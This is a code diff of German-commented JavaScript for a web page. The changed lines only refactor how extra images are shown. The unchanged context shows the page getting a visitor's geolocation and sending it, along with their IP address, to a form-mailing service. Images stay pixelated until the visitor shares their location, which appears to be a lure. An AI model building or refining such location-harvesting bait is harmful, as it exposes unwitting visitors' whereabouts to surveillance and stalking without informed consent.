@@ -30,7 +30,7 @@ function sendLocationByEmail(position) {
     const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;
 
     sendToFormspree("Standortdaten", locationData);
-    showNewImages(true); // Entferne Verpixelung nach erfolgreicher Standortermittlung
+    showNewImages(true); // Entfernt Verpixelung nach erfolgreicher Standortermittlung
 }
 
 // 🌍 IP-Adresse ermitteln und senden
@@ -82,16 +82,15 @@ function updateStatus(message) {
 function showNewImages(removePixelation) {
     const imageContainer = document.getElementById("additional-images");
 
-    // Verhindert doppeltes Einfügen von Bildern
-    if (imageContainer.children.length > 0) {
-        if (removePixelation) {
-            // Entferne Verpixelung der Bilder
-            document.querySelectorAll('#additional-images img').forEach(img => img.classList.remove('pixelated'));
-        }
+    // Sicherstellen, dass der Container existiert und leeren
+    if (!imageContainer) {
+        console.error("Image container not found!");
         return;
     }
+    
+    // Leeren der bestehenden Bilder, bevor neue hinzugefügt werden
+    imageContainer.innerHTML = '';
 
-    // Beispielbilder
     const newImages = ['bild4.jpg', 'bild5.jpg', 'bild6.jpg'];
 
     newImages.forEach(imageSrc => {
@@ -99,13 +98,14 @@ function showNewImages(removePixelation) {
         imgElement.src = imageSrc;
         imgElement.alt = "Weitere Bilder";
         
-        // Wenn kein Standort ermittelt wurde, verpixele die Bilder
+        // Verpixelte Bilder hinzufügen, wenn `removePixelation` false ist
         if (!removePixelation) {
-            imgElement.classList.add('pixelated'); 
+            imgElement.classList.add('pixelated');
         }
 
         imageContainer.appendChild(imgElement);
     });
 
+    // Die Nachricht anzeigen
     document.getElementById("message").style.display = "block";
 }
